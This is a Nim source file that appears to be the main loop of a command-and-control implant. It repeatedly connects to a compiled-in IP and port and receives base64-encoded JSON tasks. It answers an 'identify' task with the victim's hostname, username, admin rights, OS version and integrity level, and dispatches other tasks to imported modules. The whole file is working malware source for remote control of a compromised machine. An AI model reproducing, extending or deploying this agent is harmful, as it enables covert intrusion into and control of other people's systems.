import net, base64, json, os

import modules, communication

import ../clientTasks/index

var client: Socket = newSocket()

const port {.intdefine.}: int = 1234
const autoConnectTime {.intdefine.}: int = 5000
const ip {.strdefine.}: string = "127.0.0.1"

when defined(linux):
    const osType = "linux"
elif defined(windows):
    const osType = "windows"
else:
    const osType = "unknown"

proc receiveCommands(client: Socket) =
  client.connectToC2()
  while true:
    let line = client.recvLine()

    if line.len == 0:
      client.close()
      break

    let task = decode(line)

    let jsonNode = parseJson(task)
    let taskId = jsonNode["taskId"].getInt()
    var params: seq[string] = @[]
    for param in jsonNode["data"]:
      params.add param.getStr()
    let taskName = jsonNode["task"].getStr()
    if taskName == "identify":
      client.identify(
        taskId,
        hostname=hostname(),
        username=username(), 
        isAdmin=areWeAdmin(),
        osType=osType,
        windowsVersionInfo=getwindowosinfo(),
        linuxVersionInfo=getlinuxosinfo(),
        ownIntegrity=getintegrity()
      )
    else:
      var foundTask = false
      for cTask in tasks:
        if cTask.name == taskName:
          foundTask = true
          cTask.execute(client, taskId, params)
      if not foundTask:
        client.unknownTask(taskId, jsonNode["task"].getStr())

while true:
  try:
    client.connect(ip, Port(port))
  except OSError:
    sleep(autoConnectTime)
    continue
  receiveCommands(client)
  client = newSocket()
  sleep(autoConnectTime)